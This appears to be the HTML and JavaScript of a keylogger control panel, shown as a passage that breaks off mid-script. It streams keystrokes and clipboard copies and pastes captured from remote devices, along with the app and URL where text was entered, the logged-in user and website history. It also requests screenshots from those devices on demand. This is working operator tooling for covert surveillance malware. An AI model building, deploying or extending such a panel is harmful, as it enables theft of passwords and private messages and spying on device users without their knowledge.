<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Live Key Feed</title>
  <style>
    :root {
      --bg-1: #07131f;
      --bg-2: #17243a;
      --panel: rgba(9, 17, 29, 0.92);
      --bubble: linear-gradient(135deg, #1769aa, #159aab);
      --pasted-bubble: linear-gradient(135deg, #9a4d18, #c9791a);
      --copied-bubble: linear-gradient(135deg, #6b3e9a, #b05bb5);
      --text: #eff8ff;
      --muted: #9db4c9;
      --accent: #78d9d1;
      --border: rgba(157, 190, 209, 0.18);
      --shadow: rgba(0, 0, 0, 0.42);
    }

    * { box-sizing: border-box; }
    html, body {
      margin: 0;
      height: 100%;
      font-family: "Trebuchet MS", "Segoe UI", sans-serif;
      background: radial-gradient(circle at 15% 0%, rgba(120, 217, 209, 0.18), transparent 28%), radial-gradient(circle at 100% 100%, rgba(52, 115, 190, 0.18), transparent 34%), linear-gradient(135deg, var(--bg-1), var(--bg-2));
      color: var(--text);
    }
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100dvh;
      padding: 24px;
    }
    .app {
      width: min(100%, 1180px);
      height: min(90dvh, 820px);
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 24px;
      overflow: hidden;
      box-shadow: 0 28px 80px var(--shadow);
      display: flex;
      flex-direction: column;
      backdrop-filter: blur(12px);
    }
    .workspace {
      display: grid;
      grid-template-columns: 210px minmax(0, 1fr) 270px;
      flex: 1;
      min-height: 0;
    }
    .sidebar {
      padding: 20px 16px;
      border-right: 1px solid var(--border);
      background: rgba(10, 19, 31, 0.58);
    }
    .sidebar h2 {
      margin: 0 0 18px;
      color: var(--accent);
      font-size: 0.72rem;
      letter-spacing: 0.12em;
      text-transform: uppercase;
    }
    .metric {
      padding: 12px 0;
      border-top: 1px solid var(--border);
    }
    .metric-label {
      display: block;
      margin-bottom: 5px;
      color: var(--muted);
      font-size: 0.68rem;
      text-transform: uppercase;
      letter-spacing: 0.06em;
    }
    .metric-value {
      display: block;
      font-size: 0.82rem;
      line-height: 1.4;
      overflow-wrap: anywhere;
    }
    .feed-panel {
      display: flex;
      min-width: 0;
      min-height: 0;
      flex-direction: column;
    }
    .devices-panel {
      min-width: 0;
      padding: 20px 16px;
      border-left: 1px solid var(--border);
      background: rgba(10, 19, 31, 0.58);
      overflow-y: auto;
    }
    .devices-heading {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 8px;
      margin-bottom: 16px;
    }
    .devices-heading h2 {
      margin: 0;
      color: var(--accent);
      font-size: 0.72rem;
      letter-spacing: 0.12em;
      text-transform: uppercase;
    }
    .device-summary {
      display: flex;
      justify-content: space-between;
      gap: 8px;
      margin: -8px 0 8px;
      color: var(--muted);
      font-size: 0.62rem;
    }
    .online-count { color: #86efac; }
    .device-refresh { white-space: nowrap; }
    .device-count {
      color: var(--muted);
      font-size: 0.7rem;
    }
    .device-list {
      display: grid;
      gap: 10px;
    }
    .device-row {
      display: block;
      color: inherit;
      text-decoration: none;
      padding: 10px 0;
      border-top: 1px solid var(--border);
      cursor: pointer;
    }
    .device-row:hover,
    .device-row.selected { background: rgba(120, 217, 209, 0.08); }
    .device-row.online { border-top-color: rgba(34, 197, 94, 0.24); }
    .device-name {
      display: block;
      overflow-wrap: anywhere;
      font-size: 0.78rem;
      font-weight: 700;
    }
    .device-id,
    .device-seen {
      display: block;
      margin-top: 4px;
      color: var(--muted);
      font-size: 0.66rem;
      overflow-wrap: anywhere;
    }
    .device-state {
      display: inline-flex;
      align-items: center;
      gap: 5px;
      margin-top: 7px;
      font-size: 0.66rem;
      font-weight: 700;
    }
    .device-state::before {
      width: 7px;
      height: 7px;
      border-radius: 50%;
      background: #64748b;
      content: "";
    }
    .device-state.online { color: #86efac; }
    .device-state.online::before {
      background: #22c55e;
      box-shadow: 0 0 10px rgba(34, 197, 94, 0.8);
    }
    .device-state.offline { color: #fbbf93; }
    .device-state.offline::before { background: #f97316; }
    .device-actions {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-top: 9px;
    }
    .screenshot-request {
      padding: 5px 8px;
      border: 1px solid rgba(120, 217, 209, 0.35);
      border-radius: 5px;
      color: var(--accent);
      background: rgba(120, 217, 209, 0.08);
      font: inherit;
      font-size: 0.62rem;
      cursor: pointer;
    }
    .screenshot-request:disabled { opacity: 0.55; cursor: wait; }
    .screenshot-status {
      display: block;
      margin-top: 5px;
      color: var(--muted);
      font-size: 0.62rem;
    }
    .screenshot-status.failed { color: #fca5a5; }
    .screenshot-status.saved { color: #86efac; }
    .screenshot-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
      gap: 14px;
    }
    .screenshot-card {
      padding: 10px;
      border: 1px solid var(--border);
      border-radius: 8px;
      background: rgba(8, 11, 9, 0.5);
    }
    .screenshot-card img {
      display: block;
      width: 100%;
      aspect-ratio: 16 / 10;
      object-fit: contain;
      background: linear-gradient(110deg, #17221b 8%, #2b3b2e 18%, #17221b 33%);
      background-size: 200% 100%;
      animation: screenshot-loading 1.4s linear infinite;
      cursor: zoom-in;
    }
    .screenshot-card img.loaded { animation: none; background: #050706; }
    @keyframes screenshot-loading { to { background-position-x: -200%; } }
    .screenshot-card strong,
    .screenshot-card span { display: block; margin-top: 7px; font-size: 0.68rem; }
    .screenshot-card span { color: var(--muted); }
    .topbar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 20px;
      background: rgba(8, 16, 27, 0.94);
      border-bottom: 1px solid var(--border);
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 700;
      letter-spacing: 0.14em;
      text-transform: uppercase;
      font-size: 0.72rem;
      color: var(--accent);
    }
    .dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: #22c55e;
      box-shadow: 0 0 14px rgba(34, 197, 94, 0.9);
    }
    .topbar-meta {
      display: flex;
      align-items: center;
      gap: 10px;
      color: var(--muted);
      font-size: 0.68rem;
      letter-spacing: 0.04em;
      text-transform: uppercase;
    }
    .stream-pill {
      padding: 5px 9px;
      border: 1px solid rgba(120, 217, 209, 0.28);
      border-radius: 999px;
      color: var(--accent);
      background: rgba(120, 217, 209, 0.08);
      white-space: nowrap;
    }
    .support-link {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 7px 11px;
      border: 1px solid rgba(245, 158, 11, 0.34);
      border-radius: 999px;
      color: #fcd34d;
      background: rgba(245, 158, 11, 0.1);
      font-size: 0.68rem;
      font-weight: 700;
      text-decoration: none;
      white-space: nowrap;
    }
    .support-link:hover { background: rgba(245, 158, 11, 0.18); }
    .support-menu { position: relative; }
    .payment-list {
      position: absolute;
      top: calc(100% + 8px);
      right: 0;
      z-index: 2;
      display: none;
      width: min(300px, calc(100vw - 32px));
      padding: 10px;
      border: 1px solid var(--border);
      border-radius: 12px;
      background: #101d2d;
      box-shadow: 0 14px 30px var(--shadow);
    }
    .support-menu:hover .payment-list,
    .support-menu:focus-within .payment-list { display: grid; gap: 8px; }
    .payment-item {
      display: grid;
      grid-template-columns: minmax(0, 1fr) auto;
      gap: 8px;
      align-items: center;
      padding: 8px;
      border: 1px solid var(--border);
      border-radius: 8px;
    }
    .payment-details { min-width: 0; }
    .payment-name {
      display: block;
      color: var(--accent);
      font-size: 0.68rem;
      font-weight: 700;
    }
    .payment-value {
      display: block;
      margin-top: 4px;
      color: var(--muted);
      font-size: 0.65rem;
      overflow-wrap: anywhere;
    }
    .copy-payment {
      padding: 6px 8px;
      border: 1px solid rgba(120, 217, 209, 0.28);
      border-radius: 6px;
      color: var(--accent);
      background: rgba(120, 217, 209, 0.08);
      cursor: pointer;
      font: inherit;
      font-size: 0.62rem;
      font-weight: 700;
    }
    .copy-payment:hover { background: rgba(120, 217, 209, 0.18); }
    .status {
      padding: 15px 20px 0;
      color: var(--muted);
      font-size: 0.8rem;
      letter-spacing: 0.02em;
    }
    .feed {
      flex: 1;
      overflow-y: auto;
      padding: 18px 18px 24px;
      background: rgba(2, 6, 12, 0.12);
      scroll-behavior: smooth;
    }
    .feed:empty::before {
      display: block;
      padding: 12vh 24px;
      color: var(--muted);
      content: "No messages yet. Waiting for the first live event.";
      font-size: 0.86rem;
      text-align: center;
    }
    .bubble-wrap {
      display: flex;
      justify-content: flex-start;
      margin: 12px 0;
      animation: rise 0.22s ease;
    }
    .bubble {
      max-width: min(78%, 680px);
      background: var(--bubble);
      border: 1px solid rgba(255,255,255,0.12);
      border-radius: 18px 18px 18px 6px;
      padding: 12px 14px 10px;
      box-shadow: 0 12px 28px rgba(0,0,0,0.2);
      white-space: pre-wrap;
      word-break: break-word;
      line-height: 1.55;
    }
    .bubble.pasted {
      background: var(--pasted-bubble);
      border-color: rgba(253, 230, 138, 0.5);
    }
    .bubble.copied {
      background: var(--copied-bubble);
      border-color: rgba(233, 213, 255, 0.5);
    }
    .paste-label {
      display: block;
      margin-bottom: 6px;
      color: #fffbeb;
      font-size: 0.62rem;
      font-weight: 800;
      letter-spacing: 0.12em;
      text-transform: uppercase;
    }
    .time {
      display: block;
      margin-top: 6px;
      opacity: 0.82;
      font-size: 0.68rem;
      text-align: right;
    }
    .device {
      display: block;
      margin-top: 3px;
      opacity: 0.72;
      font-size: 0.64rem;
      text-align: left;
    }
    .source {
      display: block;
      margin-top: 3px;
      opacity: 0.82;
      font-size: 0.66rem;
      text-align: left;
    }
    .source-link-row {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-top: 7px;
      max-width: 100%;
    }
    .source-screenshot {
      display: block;
      width: min(100%, 560px);
      max-height: 360px;
      margin-top: 10px;
      border: 1px solid rgba(255,255,255,0.16);
      border-radius: 8px;
      object-fit: contain;
      background: rgba(0,0,0,0.2);
      cursor: zoom-in;
    }
    .source-link {
      min-width: 0;
      color: #d6fff9;
      font-size: 0.65rem;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }
    .copy-source {
      flex: 0 0 auto;
      padding: 4px 7px;
      border: 1px solid rgba(214, 255, 249, 0.35);
      border-radius: 5px;
      color: #d6fff9;
      background: rgba(214, 255, 249, 0.1);
      cursor: pointer;
      font: inherit;
      font-size: 0.6rem;
      font-weight: 700;
    }
    .copy-source:hover { background: rgba(214, 255, 249, 0.2); }
    .raw-log {
      margin: 0;
      padding: 16px;
      border: 1px solid var(--border);
      background: rgba(1, 5, 10, 0.72);
      color: #c9f7e9;
      font: 0.78rem/1.8 Consolas, "Courier New", monospace;
      white-space: pre-wrap;
      overflow-wrap: anywhere;
    }
    .feed-toolbar {
      display: grid;
      grid-template-columns: 1fr;
      gap: 10px;
      padding: 12px 20px 0;
    }
    .feed-toolbar > #scopeLabel { order: 1; }
    .feed-toolbar > .view-switch { order: 2; }
    .feed-toolbar > .message-search { order: 3; width: 100%; }
    .view-switch {
      display: grid;
      grid-template-columns: repeat(4, minmax(0, 1fr));
      width: 100%;
      border: 1px solid var(--border);
      border-radius: 8px;
      overflow: hidden;
    }
    .view-switch button {
      padding: 7px 10px;
      border: 0;
      border-right: 1px solid var(--border);
      color: var(--muted);
      background: transparent;
      cursor: pointer;
      font: inherit;
      font-size: 0.68rem;
      font-weight: 700;
      white-space: nowrap;
    }
    .view-switch button:last-child { border-right: 0; }
    .view-switch button.active { color: var(--accent); background: rgba(120, 217, 209, 0.12); }
    .raw-history-controls {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
      padding: 10px 20px 0;
    }
    .raw-history-controls input,
    .raw-history-controls button {
      min-height: 32px;
      padding: 6px 8px;
      border: 1px solid var(--border);
      border-radius: 6px;
      color: var(--text);
      background: rgba(10, 19, 31, 0.8);
      font: inherit;
      font-size: 0.68rem;
    }
    .raw-history-controls button { color: var(--accent); cursor: pointer; font-weight: 700; }
    .raw-batch {
      margin: 0 0 14px;
      border: 1px solid var(--border);
      border-radius: 8px;
      overflow: hidden;
      background: rgba(10, 19, 31, 0.65);
    }
    .raw-batch-heading {
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      gap: 8px;
      padding: 10px 12px;
      color: var(--accent);
      font-size: 0.7rem;
      font-weight: 700;
    }
    .raw-batch-heading span { color: var(--muted); font-weight: 400; }
    .raw-event {
      display: grid;
      grid-template-columns: 145px minmax(100px, 1fr) minmax(120px, 1fr);
      gap: 10px;
      padding: 7px 12px;
      border-top: 1px solid rgba(157, 190, 209, 0.1);
      color: var(--muted);
      font: 0.7rem/1.3 Consolas, "Courier New", monospace;
    }
    .raw-event code { color: var(--text); white-space: pre-wrap; overflow-wrap: anywhere; }
    @keyframes rise {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    @media (max-width: 900px) {
      .workspace { grid-template-columns: 180px minmax(0, 1fr) 230px; }
      .bubble { max-width: 86%; }
    }
    @media (max-width: 720px) {
      body { padding: 8px; }
      .app { height: calc(100dvh - 16px); min-height: 480px; border-radius: 18px; }
      .topbar { padding: 14px 16px; }
      .topbar-meta { font-size: 0.6rem; }
      .workspace {
        grid-template-columns: 1fr;
        grid-template-rows: auto minmax(0, 1fr) auto;
      }
      .sidebar {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 10px;
        padding: 12px 14px 13px;
        border-right: 0;
        border-bottom: 1px solid var(--border);
      }
      .sidebar h2 { grid-column: 1 / -1; margin: 0; }
      .metric { padding: 0; border-top: 0; }
      .metric-value { font-size: 0.72rem; }
      .status { padding: 12px 16px 0; font-size: 0.72rem; }
      .feed-toolbar { gap: 8px; padding: 12px 14px 0; }
      .view-switch { grid-template-columns: repeat(2, minmax(0, 1fr)); }
      .view-switch button:nth-child(2) { border-right: 0; }
      .view-switch button:nth-child(-n + 2) { border-bottom: 1px solid var(--border); }
      .message-search { min-height: 38px; width: 100%; }
      .feed { padding: 12px 14px 18px; }
      .bubble { max-width: 92%; padding: 11px 12px 9px; }
      .devices-panel {
        border-top: 1px solid var(--border);
        border-left: 0;
        max-height: 156px;
        padding: 14px;
      }
      .devices-heading { margin-bottom: 8px; }
      .device-list { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 8px 14px; }
      .device-row { padding: 8px 0; }
      .device-name { font-size: 0.74rem; }
      .device-id, .device-seen, .device-state { font-size: 0.62rem; }
    }
    @media (max-width: 420px) {
      .brand { font-size: 0.64rem; letter-spacing: 0.1em; }
      .topbar-meta { gap: 0; }
      .topbar-meta > span:first-child { display: none; }
      .sidebar { gap: 7px; }
      .metric-label { font-size: 0.58rem; }
      .metric-value { font-size: 0.66rem; }
      .device-list { grid-template-columns: 1fr; }
      .view-switch button { padding: 8px 6px; font-size: 0.62rem; }
      .raw-event { grid-template-columns: 1fr; gap: 3px; }
    }

    /* Focused console treatment: automatic updates stay quiet in the UI. */
    :root {
      --bg-1: #111312;
      --bg-2: #24302a;
      --panel: rgba(18, 22, 20, 0.96);
      --bubble: linear-gradient(135deg, #315c4a, #497462);
      --pasted-bubble: linear-gradient(135deg, #a34f2e, #bd7041);
      --copied-bubble: linear-gradient(135deg, #7a5a2d, #a6803b);
      --text: #f3f1e9;
      --muted: #a8b2aa;
      --accent: #d9f06d;
      --border: rgba(217, 240, 109, 0.16);
      --shadow: rgba(0, 0, 0, 0.52);
    }
    html, body {
      background: radial-gradient(circle at 12% 0%, rgba(217, 240, 109, 0.12), transparent 24%),
        radial-gradient(circle at 100% 86%, rgba(189, 112, 65, 0.13), transparent 26%),
        linear-gradient(135deg, var(--bg-1), var(--bg-2));
    }
    .app { border-radius: 12px; border-color: rgba(217, 240, 109, 0.22); }
    .topbar { padding: 19px 22px; background: rgba(13, 16, 14, 0.96); }
    .brand { color: var(--text); letter-spacing: 0.08em; }
    .brand::after { color: var(--accent); content: " / OPERATIONS"; font-weight: 400; }
    .dot { background: var(--accent); box-shadow: 0 0 14px rgba(217, 240, 109, 0.75); }
    .stream-pill, .device-refresh, .status { display: none; }
    [hidden] { display: none !important; }
    .support-link { border-radius: 6px; color: #151812; background: var(--accent); border-color: var(--accent); }
    .support-link:hover { background: #ecfa9d; }
    .workspace { grid-template-columns: 230px minmax(0, 1fr) 290px; }
    .sidebar, .devices-panel { background: rgba(16, 20, 18, 0.68); }
    .sidebar h2, .devices-heading h2 { color: var(--accent); letter-spacing: 0.16em; }
    .metric { padding: 15px 0; }
    .metric-value { font-size: 0.9rem; }
    .feed-toolbar { padding: 15px 22px 0; }
    #scopeLabel { color: var(--text); font-size: 0.78rem; font-weight: 700; }
    .message-search {
      width: min(260px, 42%);
      min-height: 32px;
      padding: 7px 10px;
      border: 1px solid var(--border);
      border-radius: 6px;
      color: var(--text);
      background: rgba(8, 11, 9, 0.72);
      font: inherit;
      font-size: 0.72rem;
      outline: none;
    }
    .message-search:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(217, 240, 109, 0.1); }
    .view-switch { border-radius: 6px; }
    .view-switch button.active { color: #151812; background: var(--accent); }
    .feed { padding: 20px 22px 28px; }
    .bubble { border-radius: 10px 10px 10px 3px; box-shadow: 0 12px 24px rgba(0,0,0,0.24); }
    .device-row { padding: 13px 10px; border-radius: 7px; border-top: 0; }
    .device-row:hover, .device-row.selected { background: rgba(217, 240, 109, 0.09); }
    .device-state.online { color: var(--accent); }
    .device-state.online::before { background: var(--accent); box-shadow: 0 0 10px rgba(217, 240, 109, 0.7); }
    @media (max-width: 720px) {
      .workspace { grid-template-columns: 1fr; }
      .message-search { width: 42%; }
    }
  </style>
</head>
<body>
  <div class="app">
    <div class="topbar">
      <div class="brand"><span class="dot"></span> Live Key Feed</div>
      <div class="topbar-meta">
        <span>Realtime monitor</span>
        <span class="stream-pill">Live stream</span>
        <div class="support-menu">
          <a class="support-link" id="supportLink" href="https://buymeacoffee.com/yourusername" target="_blank" rel="noopener noreferrer">Buy me a coffee</a>
          <div class="payment-list" id="paymentList" aria-label="Other ways to support"></div>
        </div>
      </div>
    </div>
    <div class="workspace">
      <aside class="sidebar" aria-label="Service status">
        <h2>Service status</h2>
        <div class="metric">
          <span class="metric-label">Started</span>
          <span class="metric-value" id="startedAt">Loading…</span>
        </div>
        <div class="metric">
          <span class="metric-label">Current uptime</span>
          <span class="metric-value" id="uptime">Loading…</span>
        </div>
        <div class="metric">
          <span class="metric-label">Messages stored</span>
          <span class="metric-value" id="messageCount">0</span>
        </div>
      </aside>
      <section class="feed-panel">
        <div class="status" id="status">Waiting for live stream…</div>
        <div class="feed-toolbar">
          <span id="scopeLabel">All devices</span>
          <input class="message-search" id="messageSearch" type="search" placeholder="Search messages" aria-label="Search messages" />
          <div class="view-switch" aria-label="Message view">
            <button type="button" class="active" data-mode="filtered">Filtered</button>
            <button type="button" data-mode="raw">Raw</button>
            <button type="button" data-mode="raw-history">Raw history</button>
            <button type="button" data-mode="screenshots">Screenshots</button>
            <button type="button" data-mode="website-history">Website history</button>
          </div>
        </div>
        <form class="raw-history-controls" id="rawHistoryControls" hidden>
          <input id="rawDeviceFilter" type="text" placeholder="Device ID" aria-label="Device ID" />
          <input id="rawSessionFilter" type="text" placeholder="Session ID" aria-label="Session ID" />
          <input id="rawStartFilter" type="datetime-local" aria-label="Start time" />
          <input id="rawEndFilter" type="datetime-local" aria-label="End time" />
          <button type="submit">Load history</button>
        </form>
        <div class="feed" id="feed"></div>
      </section>
      <aside class="devices-panel" aria-label="Connected devices">
        <div class="devices-heading">
          <h2>Devices</h2>
          <span class="device-count" id="deviceCount">0</span>
        </div>
        <div class="device-summary">
          <span class="online-count" id="onlineCount">0 online</span>
          <span class="device-refresh" id="deviceUpdated">Checking...</span>
        </div>
        <div class="device-list" id="deviceList">
          <span class="device-seen">Loading...</span>
        </div>
      </aside>
    </div>
  </div>

  <script>
    const feed = document.getElementById('feed');
    const statusEl = document.getElementById('status');
    const startedAtEl = document.getElementById('startedAt');
    const uptimeEl = document.getElementById('uptime');
    const messageCountEl = document.getElementById('messageCount');
    const deviceCountEl = document.getElementById('deviceCount');
    const onlineCountEl = document.getElementById('onlineCount');
    const deviceUpdatedEl = document.getElementById('deviceUpdated');
    const deviceListEl = document.getElementById('deviceList');
    const supportLinkEl = document.getElementById('supportLink');
    const paymentListEl = document.getElementById('paymentList');
    const scopeLabelEl = document.getElementById('scopeLabel');
    const messageSearchEl = document.getElementById('messageSearch');
    const rawHistoryControlsEl = document.getElementById('rawHistoryControls');
    const rawDeviceFilterEl = document.getElementById('rawDeviceFilter');
    const rawSessionFilterEl = document.getElementById('rawSessionFilter');
    const rawStartFilterEl = document.getElementById('rawStartFilter');
    const rawEndFilterEl = document.getElementById('rawEndFilter');
    const deviceUptimes = new Map();
    const deviceOnlineStates = new Map();
    const deviceClocks = new Map();
    const selectedDeviceId = new URLSearchParams(window.location.search).get('device') || '';
    let displayMode = 'filtered';
    let currentMessages = [];
    let eventSource = null;
    let serviceStartedAt = null;
    let serviceUptime = 0;
    let renderQueued = false;
    let rawHistory = [];
    const FETCH_TIMEOUT_MS = 10000;

    async function fetchJson(url) {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);
      try {
        const response = await fetch(url, { signal: controller.signal });
        if (!response.ok) throw new Error(`Request failed: ${response.status}`);
        return response.json();
      } finally {
        clearTimeout(timeout);
      }
    }

    function formatTime(ts) {
      return new Date(ts).toLocaleString([], {
        dateStyle: 'medium',
        timeStyle: 'medium'
      });
    }

    function formatUptime(seconds) {
      const days = Math.floor(seconds / 86400);
      const hours = Math.floor((seconds % 86400) / 3600);
      const minutes = Math.floor((seconds % 3600) / 60);
      const remainingSeconds = seconds % 60;
      return `${days}d ${hours}h ${minutes}m ${remainingSeconds}s`;
    }

    function formatAge(seconds) {
      if (seconds < 60) return `${seconds}s ago`;
      if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
      return `${Math.floor(seconds / 3600)}h ago`;
    }

    function updateUptime() {
      if (serviceStartedAt === null) return;
      serviceUptime += 1;
      uptimeEl.textContent = formatUptime(serviceUptime);
    }

    function updateDeviceUptimes() {
      document.querySelectorAll('.device-uptime').forEach((uptimeEl) => {
        const deviceId = uptimeEl.dataset.deviceId;
        let seconds = deviceUptimes.get(deviceId);
        if (seconds === undefined) return;
        if (deviceOnlineStates.get(deviceId)) {
          seconds += 1;
          deviceUptimes.set(deviceId, seconds);
        }
        uptimeEl.textContent = `Uptime: ${formatUptime(seconds)}`;
      });
      document.querySelectorAll('.device-local-time').forEach((timeEl) => {
        const deviceId = timeEl.dataset.deviceId;
        const clock = deviceClocks.get(deviceId);
        if (!clock) return;
        const elapsed = Date.now() - clock.receivedAt;
        timeEl.textContent = `Device time ${new Date(clock.timeMs + elapsed).toLocaleString([], { dateStyle: 'medium', timeStyle: 'medium' })}`;
      });
    }

    function renderPaymentMethods(paymentMethods) {
      paymentListEl.innerHTML = '';
      paymentMethods
        .filter((method) => method.value)
        .forEach((method) => {
          const item = document.createElement('div');
          item.className = 'payment-item';

          const details = document.createElement('div');
          details.className = 'payment-details';
          const name = document.createElement('span');
          name.className = 'payment-name';
          name.textContent = method.name;
          const value = document.createElement('span');
          value.className = 'payment-value';
          value.textContent = method.value;
          details.append(name, value);

          const copyButton = document.createElement('button');
          copyButton.className = 'copy-payment';
          copyButton.type = 'button';
          copyButton.textContent = 'Copy';
          copyButton.addEventListener('click', async () => {
            try {
              await navigator.clipboard.writeText(method.value);
              copyButton.textContent = 'Copied';
              setTimeout(() => { copyButton.textContent = 'Copy'; }, 1400);
            } catch (err) {
              copyButton.textContent = 'Select';
            }
          });

          item.append(details, copyButton);
          paymentListEl.appendChild(item);
        });
    }

    async function loadConfig() {
      try {
        const config = await fetchJson('/api/config');
        if (config.buy_me_a_coffee_url) supportLinkEl.href = config.buy_me_a_coffee_url;
        renderPaymentMethods(config.payment_methods || []);
        if (!config.buy_me_a_coffee_url && config.payment_methods?.length) {
          supportLinkEl.textContent = 'Support options';
          supportLinkEl.removeAttribute('href');
        }
      } catch (err) {
        // Keep the editable placeholder link when optional config is unavailable.
      }
    }

    async function loadDevices() {
      try {
        const devices = await fetchJson('/api/devices');
        deviceCountEl.textContent = devices.length;
        onlineCountEl.textContent = `${devices.filter((device) => device.online).length} online`;
        deviceUpdatedEl.textContent = `Updated ${new Date().toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' })}`;
        deviceListEl.innerHTML = '';
        if (!devices.length) {
          deviceListEl.innerHTML = '<span class="device-seen">No devices registered</span>';
          return;
        }
        devices.forEach((device) => {
          const deviceId = String(device.id || 'unknown');
          deviceUptimes.set(deviceId, Number(device.uptime_seconds) || 0);
          deviceOnlineStates.set(deviceId, Boolean(device.online));
          if (Number.isFinite(Number(device.local_time_ms)) && Number(device.local_time_ms) >= 100000000000) {
            deviceClocks.set(deviceId, { timeMs: Number(device.local_time_ms), receivedAt: Date.now() });
          }
          const row = document.createElement('div');
          row.className = `device-row${device.online ? ' online' : ''}${deviceId === selectedDeviceId ? ' selected' : ''}`;
          row.addEventListener('click', () => {
            window.location.href = `/?device=${encodeURIComponent(deviceId)}`;
          });

          const name = document.createElement('span');
          name.className = 'device-name';
          name.textContent = device.name || 'Unknown device';

          const id = document.createElement('span');
          id.className = 'device-id';
          id.textContent = `ID: ${device.id || 'unknown'}`;

          const state = document.createElement('span');
          state.className = `device-state ${device.online ? 'online' : 'offline'}`;
          state.textContent = device.status || (device.online ? 'Online' : 'Offline');

          const uptime = document.createElement('span');
          uptime.className = 'device-seen device-uptime';
          uptime.dataset.deviceId = deviceId;
          uptime.textContent = `Uptime: ${formatUptime(deviceUptimes.get(deviceId))}`;

          const seen = document.createElement('span');
          seen.className = 'device-seen';
          seen.textContent = device.last_seen
            ? `Last seen ${formatAge(device.last_seen_age_seconds || 0)}`
            : 'Last seen unknown';

          const joined = document.createElement('span');
          joined.className = 'device-seen';
          joined.textContent = device.joined_at
            ? `Joined ${formatTime(device.joined_at)}`
            : 'Joined date unknown';

          const localTime = document.createElement('span');
          localTime.className = 'device-seen device-local-time';
          localTime.dataset.deviceId = deviceId;
          const validDeviceTime = Number(device.local_time_ms) >= 100000000000;
          localTime.textContent = validDeviceTime
            ? `Device time ${new Date(Number(device.local_time_ms)).toLocaleString([], { dateStyle: 'medium', timeStyle: 'medium' })}`
            : device.local_time
              ? `Device time ${device.local_time}`
              : 'Device time unavailable';

          const user = document.createElement('span');
          user.className = 'device-seen';
          user.textContent = `Logged in as ${device.logged_in_user || 'Unknown user'}`;

          const battery = document.createElement('span');
          battery.className = 'device-seen';
          const batteryPercent = device.battery_percent == null ? '' : ` ${device.battery_percent}%`;
          battery.textContent = `Battery: ${device.battery_status || 'Unknown'}${batteryPercent}`;

          const actions = document.createElement('div');
          actions.className = 'device-actions';
          const screenshotButton = document.createElement('button');
          screenshotButton.className = 'screenshot-request';
          screenshotButton.type = 'button';
          screenshotButton.textContent = device.screenshot_status || 'Screenshot';
          screenshotButton.disabled = !device.online || ['Requested', 'Taking screenshot'].includes(device.screenshot_status);
          screenshotButton.addEventListener('click', async (event) => {
            event.stopPropagation();
            screenshotButton.disabled = true;
            screenshotButton.textContent = 'Requesting...';
            try {
              const response = await fetch(`/api/devices/${encodeURIComponent(deviceId)}/screenshot`, { method: 'POST' });
              if (!response.ok) throw new Error('request failed');
              screenshotButton.textContent = 'Requested';
            } catch (err) {
              screenshotButton.textContent = 'Retry';
              screenshotButton.disabled = false;
            }
          });
          actions.appendChild(screenshotButton);
          const screenshotStatus = document.createElement('span');
          screenshotStatus.className = `screenshot-status ${(device.screenshot_status || '').toLowerCase().replaceAll(' ', '-')}`;
          screenshotStatus.textContent = device.screenshot_message || 'Ready to capture';
          actions.appendChild(screenshotStatus);
          row.append(name, id, state, uptime, seen, joined, localTime, user, battery, actions);
          deviceListEl.appendChild(row);
        });
      } catch (err) {
        deviceListEl.innerHTML = '<span class="device-seen">Unavailable</span>';
      }
    }

    async function loadHealth() {
      try {
        const health = await fetchJson('/health');
        serviceStartedAt = health.started_at;
        serviceUptime = health.uptime_seconds;
        startedAtEl.textContent = formatTime(serviceStartedAt);
        messageCountEl.textContent = health.count;
        updateUptime();
      } catch (err) {
        startedAtEl.textContent = 'Unavailable';
        uptimeEl.textContent = 'Unavailable';
      }
    }

    function addMessage(msg) {
      if (displayMode === 'filtered' && msg.raw_only) return;
      const wrap = document.createElement('div');
      wrap.className = 'bubble-wrap';

      const bubble = document.createElement('div');
      const bubbleType = msg.is_pasted ? 'pasted' : (msg.is_copied ? 'copied' : '');
      bubble.className = `bubble${bubbleType ? ` ${bubbleType}` : ''}`;
      bubble.textContent = displayMode === 'raw' ? (msg.raw_text || msg.text) : msg.text;

      if (msg.is_pasted || msg.is_copied) {
        const label = document.createElement('span');
        label.className = 'paste-label';
        label.textContent = msg.is_copied ? 'Copied' : 'Pasted';
        bubble.prepend(label);
      }

      const time = document.createElement('span');
      time.className = 'time';
      time.textContent = formatTime(msg.time);
      bubble.appendChild(time);

      const device = document.createElement('span');
      device.className = 'device';
      device.textContent = `From device ${msg.device_id || 'unknown'}${msg.device_name ? ` (${msg.device_name})` : ''}`;
      bubble.appendChild(device);

      const source = document.createElement('span');
      source.className = 'source';
      source.textContent = `Entered in: ${msg.app_name || 'Unknown app'}`;
      bubble.appendChild(source);

      if (msg.source_url) {
        const sourceLinkRow = document.createElement('div');
        sourceLinkRow.className = 'source-link-row';
        const sourceLink = document.createElement('a');
        sourceLink.className = 'source-link';
        sourceLink.href = msg.source_url;
        sourceLink.target = '_blank';
        sourceLink.rel = 'noopener noreferrer';
        sourceLink.title = msg.source_url;
        sourceLink.textContent = msg.source_url;

        const copySourceButton = document.createElement('button');
        copySourceButton.className = 'copy-source';
        copySourceButton.type = 'button';
        copySourceButton.textContent = 'Copy link';
